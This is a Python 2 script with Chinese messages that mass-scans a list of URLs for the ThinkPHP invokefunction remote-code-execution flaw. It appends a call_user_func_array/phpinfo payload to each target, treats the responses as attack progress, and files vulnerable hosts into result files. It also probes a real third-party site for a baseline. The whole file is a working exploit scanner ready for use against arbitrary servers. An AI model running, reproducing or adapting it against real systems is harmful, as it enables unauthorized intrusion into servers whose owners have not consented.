# coding=utf-8
import requests
from termcolor import cprint

filename = raw_input("请输入url文件:")
f = open(filename)
fl = list(set(f))
num = 1
allnum = len(fl)

headers = {}
user_agent = "Mozilla/5.0 (Windows NT 10.0; WOW64; rv:61.0) Gecko/20100101 Firefox/61.0"
headers["User-Agent"] = user_agent

surl = "http://page.1688.com/public/index.php?s=index/\think\app/invokefunction&function=call_user_func_array&vars[0]=phpinfo&vars[1][]=1"
responsel = requests.get(surl,timeout=3)

for url in fl:
    url = url.strip("\r\n")
    if len(url)>6:
        try:
            rurl = url + "/public/index.php?s=index/\think\app/invokefunction&function=call_user_func_array&vars[0]=phpinfo&vars[1][]=1"
            #print(rurl)
            print("攻击进度:%d/%d"%(num,allnum))
            response = requests.get(rurl,headers=headers,timeout=3)
        except requests.exceptions.ContentDecodingError:
            num = num + 1
            cprint("[-] "+rurl+"====>ContentDecodingError错误", "cyan")
            e = open("扫描结果/其他.txt",'a')
            e.writelines(url+"\r\n")
            continue
        except requests.exceptions.TooManyRedirects:
            num = num + 1
            cprint("[-] "+rurl+"====>重连接次数过多", "cyan")
            b = open("扫描结果/重连接次数过多.txt",'a')
            b.writelines(url+"\r\n")
            continue
        except requests.exceptions.ConnectionError:
            num = num + 1
            continue
        except requests.exceptions.ReadTimeout:
            if response.content != responsel.content:
                
                cprint("[-] "+rurl+"====>可能不存在漏洞", "cyan")
                b = open("扫描结果/可能存在php远程代码执行漏洞.txt",'a')
                b.writelines(url+"\r\n") 
                num = num + 1
                continue
            else:
                num = num + 1
                continue
        if "PHP" in response.content or "页面错误" in response.content and response.content != responsel.content:
            cprint("[+]存在php远程代码执行漏洞...(高危)\tpayload: "+rurl, "red")
            a = open("扫描结果/php远程代码执行漏洞.txt",'a')
            a.writelines(url+"\r\n")
            num = num + 1
        elif response.status_code == 403:
            cprint("[+]出现403\tpayload: "+rurl, "red")
            c = open("扫描结果/出现403.txt",'a')
            c.writelines(url+"\r\n")
            num = num + 1
        else:
            cprint("[+]不存在php远程代码执行漏洞","white", "on_grey")
            num = num + 1
